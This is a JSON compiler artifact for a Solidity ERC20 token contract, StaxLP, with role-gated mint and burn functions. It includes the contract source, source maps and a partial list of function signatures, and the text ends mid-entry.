{"artifacts":[{"name":"StaxLP","artifactPath":"out/StaxLP.sol/StaxLP.json","sourcePath":"contracts/StaxLP.sol","contractId":"contracts/StaxLP.sol:StaxLP","sourceFileId":0,"sourceContent":"pragma solidity ^0.8.4;\n// SPDX-License-Identifier: AGPL-3.0-or-later\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\n\ncontract StaxLP is Ownable, ERC20, AccessControl {\n    bytes32 public constant CAN_MINT = keccak256(\"CAN_MINT\");\n\n    constructor(string memory _name, string memory _symbol)\n        ERC20(_name, _symbol)\n    {\n        _setupRole(DEFAULT_ADMIN_ROLE, owner());\n    }\n\n    function mint(address _to, uint256 _amount) external {\n        require(hasRole(CAN_MINT, msg.sender), \"Caller cannot mint\");\n        _mint(_to, _amount);\n    }\n\n    function burn(address _account, uint256 _amount) external {\n        require(hasRole(CAN_MINT, msg.sender), \"Caller cannot burn\");\n        _burn(_account, _amount);\n    }\n\n    function addMinter(address _account) external onlyOwner {\n        grantRole(CAN_MINT, _account);\n    }\n\n    function removeMinter(address _account) external onlyOwner {\n        revokeRole(CAN_MINT, _account);\n    }\n}\n","sourceMap":"240:826:0:-:0;;;358:146;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;428:5;435:7;936:32:4;719:10:11;936:18:4;:32::i;:::-;2044:5:5;:13;2052:5;2044;:13;:::i;:::-;-1:-1:-1;2067:7:5;:17;2077:7;2067;:17;:::i;:::-;-1:-1:-1;;2072:4:2::1;1273:6:4::0;;458:39:0::1;::::0;-1:-1:-1;;;;;;1273:6:4;458:10:0::1;:39::i;:::-;358:146:::0;;240:826;;2433:187:4;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:4;;;-1:-1:-1;;;;;;2541:17:4;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;6824:110:2:-;6902:25;6913:4;6919:7;6902:10;:25::i;:::-;6824:110;;:::o;7474:233::-;2981:4;3004:12;;;:6;:12;;;;;;;;-1:-1:-1;;;;;3004:29:2;;;;;;;;;;;;7552:149;;7595:12;;;;:6;:12;;;;;;;;-1:-1:-1;;;;;7595:29:2;;;;;;;;;:36;;-1:-1:-1;;7595:36:2;7627:4;7595:36;;;7677:12;719:10:11;;640:96;7677:12:2;-1:-1:-1;;;;;7650:40:2;7668:7;-1:-1:-1;;;;;7650:40:2;7662:4;7650:40;;;;;;;;;;7474:233;;:::o;14:127:29:-;75:10;70:3;66:20;63:1;56:31;106:4;103:1;96:15;130:4;127:1;120:15;146:840;200:5;253:3;246:4;238:6;234:17;230:27;220:55;;271:1;268;261:12;220:55;294:13;;-1:-1:-1;;;;;356:10:29;;;353:36;;;369:18;;:::i;:::-;444:2;438:9;412:2;498:13;;-1:-1:-1;;494:22:29;;;518:2;490:31;486:40;474:53;;;542:18;;;562:22;;;539:46;536:72;;;588:18;;:::i;:::-;628:10;624:2;617:22;663:2;655:6;648:18;685:4;675:14;;730:3;725:2;720;712:6;708:15;704:24;701:33;698:53;;;747:1;744;737:12;698:53;769:1;760:10;;779:133;793:2;790:1;787:9;779:133;;;881:14;;;877:23;;871:30;850:14;;;846:23;;839:63;804:10;;;;779:133;;;954:1;932:15;;;928:24;;;921:35;;;;936:6;146:840;-1:-1:-1;;;;146:840:29:o;991:562::-;1090:6;1098;1151:2;1139:9;1130:7;1126:23;1122:32;1119:52;;;1167:1;1164;1157:12;1119:52;1194:16;;-1:-1:-1;;;;;1259:14:29;;;1256:34;;;1286:1;1283;1276:12;1256:34;1309:61;1362:7;1353:6;1342:9;1338:22;1309:61;:::i;:::-;1299:71;;1416:2;1405:9;1401:18;1395:25;1379:41;;1445:2;1435:8;1432:16;1429:36;;;1461:1;1458;1451:12;1429:36;;1484:63;1539:7;1528:8;1517:9;1513:24;1484:63;:::i;:::-;1474:73;;;991:562;;;;;:::o;1558:380::-;1637:1;1633:12;;;;1680;;;1701:61;;1755:4;1747:6;1743:17;1733:27;;1701:61;1808:2;1800:6;1797:14;1777:18;1774:38;1771:161;;1854:10;1849:3;1845:20;1842:1;1835:31;1889:4;1886:1;1879:15;1917:4;1914:1;1907:15;1771:161;;1558:380;;;:::o;2069:545::-;2171:2;2166:3;2163:11;2160:448;;;2207:1;2232:5;2228:2;2221:17;2277:4;2273:2;2263:19;2347:2;2335:10;2331:19;2328:1;2324:27;2318:4;2314:38;2383:4;2371:10;2368:20;2365:47;;;-1:-1:-1;2406:4:29;2365:47;2461:2;2456:3;2452:12;2449:1;2445:20;2439:4;2435:31;2425:41;;2516:82;2534:2;2527:5;2524:13;2516:82;;;2579:17;;;2560:1;2549:13;2516:82;;;2520:3;;;2160:448;2069:545;;;:::o;2790:1352::-;2910:10;;-1:-1:-1;;;;;2932:30:29;;2929:56;;;2965:18;;:::i;:::-;2994:97;3084:6;3044:38;3076:4;3070:11;3044:38;:::i;:::-;3038:4;2994:97;:::i;:::-;3146:4;;3210:2;3199:14;;3227:1;3222:663;;;;3929:1;3946:6;3943:89;;;-1:-1:-1;3998:19:29;;;3992:26;3943:89;-1:-1:-1;;2747:1:29;2743:11;;;2739:24;2735:29;2725:40;2771:1;2767:11;;;2722:57;4045:81;;3192:944;;3222:663;2016:1;2009:14;;;2053:4;2040:18;;-1:-1:-1;;3258:20:29;;;3376:236;3390:7;3387:1;3384:14;3376:236;;;3479:19;;;3473:26;3458:42;;3571:27;;;;3539:1;3527:14;;;;3406:19;;3376:236;;;3380:3;3640:6;3631:7;3628:19;3625:201;;;3701:19;;;3695:26;-1:-1:-1;;3784:1:29;3780:14;;;3796:3;3776:24;3772:37;3768:42;3753:58;3738:74;;3625:201;-1:-1:-1;;;;;3872:1:29;3856:14;;;3852:22;3839:36;;-1:-1:-1;2790:1352:29:o;:::-;240:826:0;;;;;;","sourceMapDeployed":"240:826:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2606:202:2;;;;;;:::i;:::-;;:::i;:::-;;;470:14:29;;463:22;445:41;;433:2;418:18;2606:202:2;;;;;;;;2156:98:5;;;:::i;:::-;;;;;;;:::i;4433:197::-;;;;;;:::i;:::-;;:::i;3244:106::-;3331:12;;3244:106;;;1736:25:29;;;1724:2;1709:18;3244:106:5;1590:177:29;5192:286:5;;;;;;:::i;:::-;;:::i;4391:129:2:-;;;;;;:::i;:::-;4465:7;4491:12;;;:6;:12;;;;;:22;;;;4391:129;4816:145;;;;;;:::i;:::-;;:::i;:::-;;958:106:0;;;;;;:::i;:::-;;:::i;3093:91:5:-;;;3175:2;3064:36:29;;3052:2;3037:18;3093:91:5;2922:184:29;5925:214:2;;;;;;:::i;:::-;;:::i;5873:234:5:-;;;;;;:::i;:::-;;:::i;510:159:0:-;;;;;;:::i;:::-;;:::i;3408:125:5:-;;;;;;:::i;:::-;-1:-1:-1;;;;;3508:18:5;3482:7;3508:18;;;:9;:18;;;;;;;3408:125;1831:101:4;;;:::i;1201:85::-;1247:7;1273:6;1201:85;;-1:-1:-1;;;;;1273:6:4;;;3257:51:29;;3245:2;3230:18;1201:85:4;3111:203:29;2895:145:2;;;;;;:::i;:::-;;:::i;2367:102:5:-;;;:::i;850::0:-;;;;;;:::i;:::-;;:::i;675:169::-;;;;;;:::i;:::-;;:::i;2027:49:2:-;;2072:4;2027:49;;6594:427:5;;;;;;:::i;:::-;;:::i;3729:189::-;;;;;;:::i;:::-;;:::i;295:56:0:-;;-1:-1:-1;;;;;;;;;;;295:56:0;;5241:147:2;;;;;;:::i;:::-;;:::i;3976:149:5:-;;;;;;:::i;:::-;;:::i;2081:198:4:-;;;;;;:::i;:::-;;:::i;2606:202:2:-;2691:4;-1:-1:-1;;;;;;2714:47:2;;-1:-1:-1;;;2714:47:2;;:87;;-1:-1:-1;;;;;;;;;;937:40:13;;;2765:36:2;2707:94;2606:202;-1:-1:-1;;2606:202:2:o;2156:98:5:-;2210:13;2242:5;2235:12;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2156:98;:::o;4433:197::-;4516:4;719:10:11;4570:32:5;719:10:11;4586:7:5;4595:6;4570:8;:32::i;:::-;-1:-1:-1;4619:4:5;;4433:197;-1:-1:-1;;;4433:197:5:o;5192:286::-;5319:4;719:10:11;5375:38:5;5391:4;719:10:11;5406:6:5;5375:15;:38::i;:::-;5423:27;5433:4;5439:2;5443:6;5423:9;:27::i;:::-;-1:-1:-1;5467:4:5;;5192:286;-1:-1:-1;;;;5192:286:5:o;4816:145:2:-;4465:7;4491:12;;;:6;:12;;;;;:22;;;2505:16;2516:4;2505:10;:16::i;:::-;4929:25:::1;4940:4;4946:7;4929:10;:25::i;:::-;4816:145:::0;;;:::o;958:106:0:-;1094:13:4;:11;:13::i;:::-;1027:30:0::1;-1:-1:-1::0;;;;;;;;;;;1048:8:0::1;1027:10;:30::i;:::-;958:106:::0;:::o;5925:214:2:-;-1:-1:-1;;;;;6020:23:2;;719:10:11;6020:23:2;6012:83;;;;-1:-1:-1;;;6012:83:2;;4171:2:29;6012:83:2;;;4153:21:29;4210:2;4190:18;;;4183:30;4249:34;4229:18;;;4222:62;-1:-1:-1;;;4300:18:29;;;4293:45;4355:19;;6012:83:2;;;;;;;;;6106:26;6118:4;6124:7;6106:11;:26::i;:::-;5925:214;;:::o;5873:234:5:-;5961:4;719:10:11;6015:64:5;719:10:11;6031:7:5;6068:10;6040:25;719:10:11;6031:7:5;6040:9;:25::i;:::-;:38;;;;:::i;:::-;6015:8;:64::i;510:159:0:-;581:29;-1:-1:-1;;;;;;;;;;;599:10:0;581:7;:29::i;:::-;573:60;;;;-1:-1:-1;;;573:60:0;;4849:2:29;573:60:0;;;4831:21:29;4888:2;4868:18;;;4861:30;-1:-1:-1;;;4907:18:29;;;4900:48;4965:18;;573:60:0;4647:342:29;573:60:0;643:19;649:3;654:7;643:5;:19::i;1831:101:4:-;1094:13;:11;:13::i;:::-;1895:30:::1;1922:1;1895:18;:30::i;:::-;1831:101::o:0;2895:145:2:-;2981:4;3004:12;;;:6;:12;;;;;;;;-1:-1:-1;;;;;3004:29:2;;;;;;;;;;;;;;;2895:145::o;2367:102:5:-;2423:13;2455:7;2448:14;;;;;:::i;850:102:0:-;1094:13:4;:11;:13::i;:::-;916:29:0::1;-1:-1:-1::0;;;;;;;;;;;936:8:0::1;916:9;:29::i;675:169::-:0;751:29;-1:-1:-1;;;;;;;;;;;769:10:0;751:7;:29::i;:::-;743:60;;;;-1:-1:-1;;;743:60:0;;5196:2:29;743:60:0;;;5178:21:29;5235:2;5215:18;;;5208:30;-1:-1:-1;;;5254:18:29;;;5247:48;5312:18;;743:60:0;4994:342:29;743:60:0;813:24;819:8;829:7;813:5;:24::i;6594:427:5:-;6687:4;719:10:11;6687:4:5;6768:25;719:10:11;6785:7:5;6768:9;:25::i;:::-;6741:52;;6831:15;6811:16;:35;;6803:85;;;;-1:-1:-1;;;6803:85:5;;5543:2:29;6803:85:5;;;5525:21:29;5582:2;5562:18;;;5555:30;5621:34;5601:18;;;5594:62;-1:-1:-1;;;5672:18:29;;;5665:35;5717:19;;6803:85:5;5341:401:29;6803:85:5;6922:60;6931:5;6938:7;6966:15;6947:16;:34;6922:8;:60::i;3729:189::-;3808:4;719:10:11;3862:28:5;719:10:11;3879:2:5;3883:6;3862:9;:28::i;5241:147:2:-;4465:7;4491:12;;;:6;:12;;;;;:22;;;2505:16;2516:4;2505:10;:16::i;:::-;5355:26:::1;5367:4;5373:7;5355:11;:26::i;3976:149:5:-:0;-1:-1:-1;;;;;4091:18:5;;;4065:7;4091:18;;;:11;:18;;;;;;;;:27;;;;;;;;;;;;;3976:149::o;2081:198:4:-;1094:13;:11;:13::i;:::-;-1:-1:-1;;;;;2169:22:4;::::1;2161:73;;;::::0;-1:-1:-1;;;2161:73:4;;5949:2:29;2161:73:4::1;::::0;::::1;5931:21:29::0;5988:2;5968:18;;;5961:30;6027:34;6007:18;;;6000:62;-1:-1:-1;;;6078:18:29;;;6071:36;6124:19;;2161:73:4::1;5747:402:29::0;2161:73:4::1;2244:28;2263:8;2244:18;:28::i;10110:370:5:-:0;-1:-1:-1;;;;;10241:19:5;;10233:68;;;;-1:-1:-1;;;10233:68:5;;6356:2:29;10233:68:5;;;6338:21:29;6395:2;6375:18;;;6368:30;6434:34;6414:18;;;6407:62;-1:-1:-1;;;6485:18:29;;;6478:34;6529:19;;10233:68:5;6154:400:29;10233:68:5;-1:-1:-1;;;;;10319:21:5;;10311:68;;;;-1:-1:-1;;;10311:68:5;;6761:2:29;10311:68:5;;;6743:21:29;6800:2;6780:18;;;6773:30;6839:34;6819:18;;;6812:62;-1:-1:-1;;;6890:18:29;;;6883:32;6932:19;;10311:68:5;6559:398:29;10311:68:5;-1:-1:-1;;;;;10390:18:5;;;;;;;:11;:18;;;;;;;;:27;;;;;;;;;;;;;:36;;;10441:32;;1736:25:29;;;10441:32:5;;1709:18:29;10441:32:5;;;;;;;10110:370;;;:::o;10761:441::-;10891:24;10918:25;10928:5;10935:7;10918:9;:25::i;:::-;10891:52;;-1:-1:-1;;10957:16:5;:37;10953:243;;11038:6;11018:16;:26;;11010:68;;;;-1:-1:-1;;;11010:68:5;;7164:2:29;11010:68:5;;;7146:21:29;7203:2;7183:18;;;7176:30;7242:31;7222:18;;;7215:59;7291:18;;11010:68:5;6962:353:29;11010:68:5;11120:51;11129:5;11136:7;11164:6;11145:16;:25;11120:8;:51::i;:::-;10881:321;10761:441;;;:::o;7475:651::-;-1:-1:-1;;;;;7601:18:5;;7593:68;;;;-1:-1:-1;;;7593:68:5;;7522:2:29;7593:68:5;;;7504:21:29;7561:2;7541:18;;;7534:30;7600:34;7580:18;;;7573:62;-1:-1:-1;;;7651:18:29;;;7644:35;7696:19;;7593:68:5;7320:401:29;7593:68:5;-1:-1:-1;;;;;7679:16:5;;7671:64;;;;-1:-1:-1;;;7671:64:5;;7928:2:29;7671:64:5;;;7910:21:29;7967:2;7947:18;;;7940:30;8006:34;7986:18;;;7979:62;-1:-1:-1;;;8057:18:29;;;8050:33;8100:19;;7671:64:5;7726:399:29;7671:64:5;-1:-1:-1;;;;;7817:15:5;;7795:19;7817:15;;;:9;:15;;;;;;7850:21;;;;7842:72;;;;-1:-1:-1;;;7842:72:5;;8332:2:29;7842:72:5;;;8314:21:29;8371:2;8351:18;;;8344:30;8410:34;8390:18;;;8383:62;-1:-1:-1;;;8461:18:29;;;8454:36;8507:19;;7842:72:5;8130:402:29;7842:72:5;-1:-1:-1;;;;;7948:15:5;;;;;;;:9;:15;;;;;;7966:20;;;7948:38;;8006:13;;;;;;;;:23;;7980:6;;7948:15;8006:23;;7980:6;;8006:23;:::i;:::-;;;;;;;;8060:2;-1:-1:-1;;;;;8045:26:5;8054:4;-1:-1:-1;;;;;8045:26:5;;8064:6;8045:26;;;;1736:25:29;;1724:2;1709:18;;1590:177;8045:26:5;;;;;;;;8082:37;4816:145:2;3334:103;3400:30;3411:4;719:10:11;3400::2;:30::i;7474:233::-;7557:22;7565:4;7571:7;7557;:22::i;:::-;7552:149;;7595:12;;;;:6;:12;;;;;;;;-1:-1:-1;;;;;7595:29:2;;;;;;;;;:36;;-1:-1:-1;;7595:36:2;7627:4;7595:36;;;7677:12;719:10:11;;640:96;7677:12:2;-1:-1:-1;;;;;7650:40:2;7668:7;-1:-1:-1;;;;;7650:40:2;7662:4;7650:40;;;;;;;;;;7474:233;;:::o;1359:130:4:-;1247:7;1273:6;-1:-1:-1;;;;;1273:6:4;719:10:11;1422:23:4;1414:68;;;;-1:-1:-1;;;1414:68:4;;8739:2:29;1414:68:4;;;8721:21:29;;;8758:18;;;8751:30;8817:34;8797:18;;;8790:62;8869:18;;1414:68:4;8537:356:29;7878:234:2;7961:22;7969:4;7975:7;7961;:22::i;:::-;7957:149;;;8031:5;7999:12;;;:6;:12;;;;;;;;-1:-1:-1;;;;;7999:29:2;;;;;;;;;;:37;;-1:-1:-1;;7999:37:2;;;8055:40;719:10:11;;7999:12:2;;8055:40;;8031:5;8055:40;7878:234;;:::o;8402:389:5:-;-1:-1:-1;;;;;8485:21:5;;8477:65;;;;-1:-1:-1;;;8477:65:5;;9100:2:29;8477:65:5;;;9082:21:29;9139:2;9119:18;;;9112:30;9178:33;9158:18;;;9151:61;9229:18;;8477:65:5;8898:355:29;8477:65:5;8629:6;8613:12;;:22;;;;;;;:::i;:::-;;;;-1:-1:-1;;;;;;;8645:18:5;;;;;;:9;:18;;;;;:28;;8667:6;;8645:18;:28;;8667:6;;8645:28;:::i;:::-;;;;-1:-1:-1;;8688:37:5;;1736:25:29;;;-1:-1:-1;;;;;8688:37:5;;;8705:1;;8688:37;;1724:2:29;1709:18;8688:37:5;;;;;;;5925:214:2;;:::o;2433:187:4:-;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:4;;;-1:-1:-1;;;;;;2541:17:4;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;9111:576:5:-;-1:-1:-1;;;;;9194:21:5;;9186:67;;;;-1:-1:-1;;;9186:67:5;;9460:2:29;9186:67:5;;;9442:21:29;9499:2;9479:18;;;9472:30;9538:34;9518:18;;;9511:62;-1:-1:-1;;;9589:18:29;;;9582:31;9630:19;;9186:67:5;9258:397:29;9186:67:5;-1:-1:-1;;;;;9349:18:5;;9324:22;9349:18;;;:9;:18;;;;;;9385:24;;;;9377:71;;;;-1:-1:-1;;;9377:71:5;;9862:2:29;9377:71:5;;;9844:21:29;9901:2;9881:18;;;9874:30;9940:34;9920:18;;;9913:62;-1:-1:-1;;;9991:18:29;;;9984:32;10033:19;;9377:71:5;9660:398:29;9377:71:5;-1:-1:-1;;;;;9482:18:5;;;;;;:9;:18;;;;;9503:23;;;9482:44;;9546:12;:22;;9520:6;;9482:18;9546:22;;9520:6;;9546:22;:::i;:::-;;;;-1:-1:-1;;9584:37:5;;1736:25:29;;;9610:1:5;;-1:-1:-1;;;;;9584:37:5;;;;;1724:2:29;1709:18;9584:37:5;;;;;;;4816:145:2;;;:::o;3718:492::-;3806:22;3814:4;3820:7;3806;:22::i;:::-;3801:403;;3989:41;4017:7;-1:-1:-1;;;;;3989:41:2;4027:2;3989:19;:41::i;:::-;4101:38;4129:4;4136:2;4101:19;:38::i;:::-;3896:265;;;;;;;;;:::i;:::-;;;;-1:-1:-1;;3896:265:2;;;;;;;;;;-1:-1:-1;;;3844:349:2;;;;;;;:::i;1652:441:12:-;1727:13;1752:19;1784:10;1788:6;1784:1;:10;:::i;:::-;:14;;1797:1;1784:14;:::i;:::-;1774:25;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1774:25:12;;1752:47;;-1:-1:-1;;;1809:6:12;1816:1;1809:9;;;;;;;;:::i;:::-;;;;:15;-1:-1:-1;;;;;1809:15:12;;;;;;;;;-1:-1:-1;;;1834:6:12;1841:1;1834:9;;;;;;;;:::i;:::-;;;;:15;-1:-1:-1;;;;;1834:15:12;;;;;;;;-1:-1:-1;1864:9:12;1876:10;1880:6;1876:1;:10;:::i;:::-;:14;;1889:1;1876:14;:::i;:::-;1864:26;;1859:132;1896:1;1892;:5;1859:132;;;-1:-1:-1;;;1943:5:12;1951:3;1943:11;1930:25;;;;;;;:::i;:::-;;;;1918:6;1925:1;1918:9;;;;;;;;:::i;:::-;;;;:37;-1:-1:-1;;;;;1918:37:12;;;;;;;;-1:-1:-1;1979:1:12;1969:11;;;;;1899:3;;;:::i;:::-;;;1859:132;;;-1:-1:-1;2008:10:12;;2000:55;;;;-1:-1:-1;;;2000:55:12;;11793:2:29;2000:55:12;;;11775:21:29;;;11812:18;;;11805:30;11871:34;11851:18;;;11844:62;11923:18;;2000:55:12;11591:356:29;2000:55:12;2079:6;1652:441;-1:-1:-1;;;1652:441:12:o;14:286:29:-;72:6;125:2;113:9;104:7;100:23;96:32;93:52;;;141:1;138;131:12;93:52;167:23;;-1:-1:-1;;;;;;219:32:29;;209:43;;199:71;;266:1;263;256:12;497:250;582:1;592:113;606:6;603:1;600:13;592:113;;;682:11;;;676:18;663:11;;;656:39;628:2;621:10;592:113;;;-1:-1:-1;;739:1:29;721:16;;714:27;497:250::o;752:396::-;901:2;890:9;883:21;864:4;933:6;927:13;976:6;971:2;960:9;956:18;949:34;992:79;1064:6;1059:2;1048:9;1044:18;1039:2;1031:6;1027:15;992:79;:::i;:::-;1132:2;1111:15;-1:-1:-1;;1107:29:29;1092:45;;;;1139:2;1088:54;;752:396;-1:-1:-1;;752:396:29:o;1153:173::-;1221:20;;-1:-1:-1;;;;;1270:31:29;;1260:42;;1250:70;;1316:1;1313;1306:12;1250:70;1153:173;;;:::o;1331:254::-;1399:6;1407;1460:2;1448:9;1439:7;1435:23;1431:32;1428:52;;;1476:1;1473;1466:12;1428:52;1499:29;1518:9;1499:29;:::i;:::-;1489:39;1575:2;1560:18;;;;1547:32;;-1:-1:-1;;;1331:254:29:o;1772:328::-;1849:6;1857;1865;1918:2;1906:9;1897:7;1893:23;1889:32;1886:52;;;1934:1;1931;1924:12;1886:52;1957:29;1976:9;1957:29;:::i;:::-;1947:39;;2005:38;2039:2;2028:9;2024:18;2005:38;:::i;:::-;1995:48;;2090:2;2079:9;2075:18;2062:32;2052:42;;1772:328;;;;;:::o;2105:180::-;2164:6;2217:2;2205:9;2196:7;2192:23;2188:32;2185:52;;;2233:1;2230;2223:12;2185:52;-1:-1:-1;2256:23:29;;2105:180;-1:-1:-1;2105:180:29:o;2472:254::-;2540:6;2548;2601:2;2589:9;2580:7;2576:23;2572:32;2569:52;;;2617:1;2614;2607:12;2569:52;2653:9;2640:23;2630:33;;2682:38;2716:2;2705:9;2701:18;2682:38;:::i;:::-;2672:48;;2472:254;;;;;:::o;2731:186::-;2790:6;2843:2;2831:9;2822:7;2818:23;2814:32;2811:52;;;2859:1;2856;2849:12;2811:52;2882:29;2901:9;2882:29;:::i;3319:260::-;3387:6;3395;3448:2;3436:9;3427:7;3423:23;3419:32;3416:52;;;3464:1;3461;3454:12;3416:52;3487:29;3506:9;3487:29;:::i;:::-;3477:39;;3535:38;3569:2;3558:9;3554:18;3535:38;:::i;3584:380::-;3663:1;3659:12;;;;3706;;;3727:61;;3781:4;3773:6;3769:17;3759:27;;3727:61;3834:2;3826:6;3823:14;3803:18;3800:38;3797:161;;3880:10;3875:3;3871:20;3868:1;3861:31;3915:4;3912:1;3905:15;3943:4;3940:1;3933:15;3797:161;;3584:380;;;:::o;4385:127::-;4446:10;4441:3;4437:20;4434:1;4427:31;4477:4;4474:1;4467:15;4501:4;4498:1;4491:15;4517:125;4582:9;;;4603:10;;;4600:36;;;4616:18;;:::i;10063:128::-;10130:9;;;10151:11;;;10148:37;;;10165:18;;:::i;10196:812::-;10607:25;10602:3;10595:38;10577:3;10662:6;10656:13;10678:75;10746:6;10741:2;10736:3;10732:12;10725:4;10717:6;10713:17;10678:75;:::i;:::-;-1:-1:-1;;;10812:2:29;10772:16;;;10804:11;;;10797:40;10862:13;;10884:76;10862:13;10946:2;10938:11;;10931:4;10919:17;;10884:76;:::i;:::-;10980:17;10999:2;10976:26;;10196:812;-1:-1:-1;;;;10196:812:29:o;11013:168::-;11086:9;;;11117;;11134:15;;;11128:22;;11114:37;11104:71;;11155:18;;:::i;11186:127::-;11247:10;11242:3;11238:20;11235:1;11228:31;11278:4;11275:1;11268:15;11302:4;11299:1;11292:15;11318:127;11379:10;11374:3;11370:20;11367:1;11360:31;11410:4;11407:1;11400:15;11434:4;11431:1;11424:15;11450:136;11489:3;11517:5;11507:39;;11526:18;;:::i;:::-;-1:-1:-1;;;11562:18:29;;11450:136::o","constructor":{"id":"contracts/StaxLP.sol:StaxLP:constructor","contractId":"contracts/StaxLP.sol:StaxLP","inputs":[{"name":"_name","kind":"String","internalType":"string"},{"name":"_symbol","kind":"String","internalType":"string"}]},"functions":[{"id":"contracts/StaxLP.sol:StaxLP:CAN_MINT()(bytes32)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"CAN_MINT():(bytes32)","shortSignature":"cda472b0","name":"CAN_MINT","inputs":[],"outputs":[{"name":"","kind":{"FixedBytes":32},"internalType":"bytes32"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:DEFAULT_ADMIN_ROLE()(bytes32)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"DEFAULT_ADMIN_ROLE():(bytes32)","shortSignature":"a217fddf","name":"DEFAULT_ADMIN_ROLE","inputs":[],"outputs":[{"name":"","kind":{"FixedBytes":32},"internalType":"bytes32"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:addMinter(address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"addMinter(address)","shortSignature":"983b2d56","name":"addMinter","inputs":[{"name":"_account","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:allowance(address,address)(uint256)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"allowance(address,address):(uint256)","shortSignature":"dd62ed3e","name":"allowance","inputs":[{"name":"owner","kind":"Address","internalType":"address"},{"name":"spender","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:approve(address,uint256)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"approve(address,uint256):(bool)","shortSignature":"095ea7b3","name":"approve","inputs":[{"name":"spender","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:balanceOf(address)(uint256)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"balanceOf(address):(uint256)","shortSignature":"70a08231","name":"balanceOf","inputs":[{"name":"account","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:burn(address,uint256)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"burn(address,uint256)","shortSignature":"9dc29fac","name":"burn","inputs":[{"name":"_account","kind":"Address","internalType":"address"},{"name":"_amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:decimals()(uint8)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"decimals():(uint8)","shortSignature":"313ce567","name":"decimals","inputs":[],"outputs":[{"name":"","kind":{"Uint":8},"internalType":"uint8"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:decreaseAllowance(address,uint256)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"decreaseAllowance(address,uint256):(bool)","shortSignature":"a457c2d7","name":"decreaseAllowance","inputs":[{"name":"spender","kind":"Address","internalType":"address"},{"name":"subtractedValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:getRoleAdmin(bytes32)(bytes32)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"getRoleAdmin(bytes32):(bytes32)","shortSignature":"248a9ca3","name":"getRoleAdmin","inputs":[{"name":"role","kind":{"FixedBytes":32},"internalType":"bytes32"}],"outputs":[{"name":"","kind":{"FixedBytes":32},"internalType":"bytes32"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:grantRole(bytes32,address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"grantRole(bytes32,address)","shortSignature":"2f2ff15d","name":"grantRole","inputs":[{"name":"role","kind":{"FixedBytes":32},"internalType":"bytes32"},{"name":"account","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:hasRole(bytes32,address)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"hasRole(bytes32,address):(bool)","shortSignature":"91d14854","name":"hasRole","inputs":[{"name":"role","kind":{"FixedBytes":32},"internalType":"bytes32"},{"name":"account","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"i